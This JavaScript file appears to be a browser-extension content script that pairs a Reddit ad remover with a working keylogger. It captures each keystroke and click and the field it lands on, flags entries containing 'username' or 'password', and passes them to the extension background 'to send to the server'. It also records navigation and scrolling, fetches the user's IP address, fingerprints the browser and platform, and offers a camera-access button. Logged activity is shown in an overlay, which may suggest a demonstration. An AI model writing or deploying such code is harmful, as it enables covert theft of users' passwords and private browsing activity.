function removeAds() {
  const promotedPosts = document.querySelectorAll('shreddit-ad-post');
  promotedPosts.forEach(post => post.remove());

  const adElements = document.querySelectorAll('[data-before-content="advertisement"]');
  adElements.forEach(ad => ad.remove());
}


// gets the user's IP - not the most reliable but it works most of the time
async function fetchIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unable to fetch IP';
    }
}

function createOverlay() {
    const wrapper = document.createElement('div');
    wrapper.id = 'keylog-overlay-wrapper';
    document.body.appendChild(wrapper);

    const container = document.createElement('div');
    container.id = 'keylog-container';
    wrapper.appendChild(container);

    const overlay = document.createElement('div');
    overlay.id = 'keylog-overlay';
    
    const dataBox = document.createElement('div');
    dataBox.id = 'data-box';
    
    container.addEventListener('mousedown', initDrag);
    
    container.addEventListener('selectstart', (e) => e.preventDefault());

    // prevents clicks/scrolls/touches from propagating up to parent elements
    // would mess up our overlay dragging functionality
    [overlay, dataBox].forEach(element => {
        element.addEventListener('mousedown', (e) => e.stopPropagation());
        element.addEventListener('wheel', (e) => e.stopPropagation(), { passive: false });
        element.addEventListener('touchstart', (e) => e.stopPropagation(), { passive: false });
        element.addEventListener('touchmove', (e) => e.stopPropagation(), { passive: false });
    });

    container.appendChild(overlay);
    container.appendChild(dataBox);
    
    updateDataBox(dataBox);

    setInterval(() => updateDataBox(dataBox), 5000);

    const controlBox = createControlBox();
    container.appendChild(controlBox);

    return overlay;
}

function initDrag(e) {
    const container = e.currentTarget;
    const startPos = {
        x: e.clientX - container.offsetLeft,
        y: e.clientY - container.offsetTop
    };
    
    function dragMove(e) {
        container.style.left = (e.clientX - startPos.x) + 'px';
        container.style.top = (e.clientY - startPos.y) + 'px';
        container.style.right = 'auto';
        container.style.bottom = 'auto';
    }
    
    function dragEnd() {
        document.removeEventListener('mousemove', dragMove);
        document.removeEventListener('mouseup', dragEnd);
    }
    
    document.addEventListener('mousemove', dragMove);
    document.addEventListener('mouseup', dragEnd);
}

function getElementDescription(element) {
    const identifiers = [];
    
    identifiers.push(element.tagName.toLowerCase());
    
    if (element.id) {
        identifiers.push(`#${element.id}`);
    }
    
    const type = element.getAttribute('type');
    if (type) {
        identifiers.push(`[type="${type}"]`);
    }
    
    const placeholder = element.getAttribute('placeholder');
    if (placeholder) {
        identifiers.push(`[placeholder="${placeholder}"]`);
    }
    
    const name = element.getAttribute('name');
    if (name) {
        identifiers.push(`[name="${name}"]`);
    }
    
    // helps identify elements without making the selector too specific/messy when debugging
    if (element.className && typeof element.className === 'string') {
        const classes = element.className.split(' ')
            .filter(c => c.trim())
            .slice(0, 2)
            .map(c => `.${c}`);
        identifiers.push(...classes);
    }
    
    const text = element.textContent?.trim();
    if (text && text.length <= 20) {
        identifiers.push(`"${text}"`);
    }
    
    return identifiers.join(' ');
}

function initKeylogger() {
    const overlay = createOverlay();
    const maxEntries = 50;
    let entries = [];

    function addEntry(message, type) {
        const timestamp = new Date().toLocaleTimeString();
        const entry = document.createElement('div');
        entry.className = 'keylog-entry';
        
        const lowerMessage = message.toLowerCase();
        if (lowerMessage.includes('username')) {
            entry.classList.add('contains-username');
        }
        if (lowerMessage.includes('password')) {
            entry.classList.add('contains-password');
        }
        
        entry.innerHTML = `
            <span class="timestamp">[${timestamp}]</span>
            <span class="type">${type}:</span>
            <span class="content">${message}</span>
        `;
        
        entries.unshift(entry);
        if (entries.length > maxEntries) {
            const removed = entries.pop();
            removed.remove();
        }
        
        overlay.insertBefore(entry, overlay.firstChild);

        // Sends the data to background to send to the server
        const data = { timestamp, type, message};
        chrome.runtime.sendMessage(
            {
                type: "DATA_LOG",
                payload: data,
            },
            (response) => {
                console.log("Server response:", response);
            }
        );
    }

    document.addEventListener('keydown', (e) => {
        if (e.ctrlKey || e.altKey || e.metaKey) return;
        
        let keyDisplay = e.key;
        if (keyDisplay === ' ') keyDisplay = 'Space';
        if (keyDisplay.length === 1) keyDisplay = keyDisplay.toUpperCase();
        
        const activeElement = document.activeElement;
        const elementDesc = getElementDescription(activeElement);
        
        addEntry(`${keyDisplay} (on ${elementDesc})`, 'Key');
    });

    document.addEventListener('click', (e) => {
        const button = ['Left', 'Middle', 'Right'][e.button] || 'Unknown';
        const elementDesc = getElementDescription(e.target);
        const coords = `at (${e.clientX}, ${e.clientY})`;
        
        addEntry(`${button} Click on ${elementDesc} ${coords}`, 'Mouse');
    });

    let lastUrl = window.location.href;

    const urlObserver = new MutationObserver(() => {
        if (window.location.href !== lastUrl) {
            const newUrl = window.location.href;
            const entry = document.createElement('div');
            entry.className = 'keylog-entry contains-navigation';
            
            const timestamp = new Date().toLocaleTimeString();
            entry.innerHTML = `
                <span class="timestamp">[${timestamp}]</span>
                <span class="type">Navigation:</span>
                <span class="content">Navigated to ${newUrl}</span>
            `;
            
            entries.unshift(entry);
            if (entries.length > maxEntries) {
                const removed = entries.pop();
                removed.remove();
            }
            
            overlay.insertBefore(entry, overlay.firstChild);
            lastUrl = newUrl;
        }
    });

    urlObserver.observe(document.body, {
        childList: true,
        subtree: true
    });

    let lastScrollY = window.scrollY;
    let scrollTimeout;

    function checkScroll() {
        const currentScrollY = window.scrollY;
        if (currentScrollY !== lastScrollY) {
            const scrollDiff = currentScrollY - lastScrollY;
            const direction = scrollDiff > 0 ? 'down' : 'up';
            const pixels = Math.abs(scrollDiff);
            
            const entry = document.createElement('div');
            entry.className = 'keylog-entry contains-scroll';
            const timestamp = new Date().toLocaleTimeString();
            entry.innerHTML = `
                <span class="timestamp">[${timestamp}]</span>
                <span class="type">Scroll:</span>
                <span class="content">Scrolled ${direction} ${pixels}px</span>
            `;
            
            entries.unshift(entry);
            if (entries.length > maxEntries) {
                const removed = entries.pop();
                removed.remove();
            }
            
            overlay.insertBefore(entry, overlay.firstChild);
            lastScrollY = currentScrollY;
        }
    }

    // check for scroll position updates every 3 seconds
    setInterval(checkScroll, 3000);
}

function ensureOverlayOnTop() {
    const wrapper = document.getElementById('keylog-overlay-wrapper');
    if (wrapper && wrapper.parentNode !== document.body) {
        document.body.appendChild(wrapper);
    }
}


function init() {
    removeAds();
    initKeylogger();
    
    // ensure the overlay stays on top of everything - probably a better way to do this but whatever
    setInterval(ensureOverlayOnTop, 1000);
}

init();

const observer = new MutationObserver((mutations) => {
    mutations.forEach((mutation) => {
        if (mutation.addedNodes.length) {
            removeAds();
            ensureOverlayOnTop();
        }
    });
});

observer.observe(document.body, { 
    childList: true,
    subtree: true
}); 

// was showing up as MacIntel but my mac is Apple Silicon so I used info m https://stackoverflow.com/questions/64853342/whats-the-value-of-navigator-platform-on-arm-macs
function getPlatform() {
    const ua = navigator.userAgent;
    if (ua.includes('Mac')) {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                if (renderer.includes('Apple M')) {
                    return 'macOS (Apple Silicon)';
                }
            }
            return 'macOS (Intel)';
        } catch (e) {
            return 'macOS (Intel)'; // if WebGL check fails just default to Intel
        }
    }
    return navigator.platform; // deprecated but still works
}

async function fetchSystemData() {
    try {
        const ip = await fetchIP();
        const maxScreenRes = `${window.screen.width}x${window.screen.height}`;
        const currentRes = `${window.innerWidth}x${window.innerHeight}`;
        const browser = getBrowserInfo();
        const platform = getPlatform();
        
        return {
            ip,
            maxScreenRes,
            currentRes,
            browser,
            platform
        };
    } catch (error) {
        return 'Unable to fetch system data';
    }
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = "Unknown";
    let version = "";
    
    if (ua.includes("Firefox")) {
        browser = "Firefox";
        version = ua.match(/Firefox\/([\d.]+)/)?.[1] || "";
    } else if (ua.includes("Chrome")) {
        browser = "Chrome"; 
        version = ua.match(/Chrome\/([\d.]+)/)?.[1] || "";
    } else if (ua.includes("Safari")) {
        browser = "Safari";
        version = ua.match(/Version\/([\d.]+)/)?.[1] || "";
    } else if (ua.includes("Edge")) {
        browser = "Edge";
        version = ua.match(/Edge?\/([\d.]+)/)?.[1] || "";
    }
    
    return version ? `${browser} (${version})` : browser;
}

window.addEventListener('resize', () => {
    const dataBox = document.getElementById('data-box');
    if (dataBox) {
        updateDataBox(dataBox);
    }
});

function updateDataBox(dataBox) {
    fetchSystemData().then(data => {
        dataBox.innerHTML = `
            <div class="data-item"><span class="data-label">IP Address:</span> <span class="data-value">${data.ip}</span></div>
            <div class="data-item"><span class="data-label">Resolution:</span> <span class="data-value">${data.maxScreenRes} (${data.currentRes})</span></div>
            <div class="data-item"><span class="data-label">Browser:</span> <span class="data-value">${data.browser}</span></div>
            <div class="data-item"><span class="data-label">Platform:</span> <span class="data-value">${data.platform}</span></div>
        `;
    });
}

function createControlBox() {
    const controlBox = document.createElement('div');
    controlBox.id = 'control-box';

    const button = document.createElement('button');
    button.className = 'control-button';
    button.textContent = 'Request Camera';
    
    button.addEventListener('click', async () => {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        button.classList.add('active');
        stream.getTracks().forEach(track => track.stop());
    });

    controlBox.appendChild(button);
    return controlBox;
} 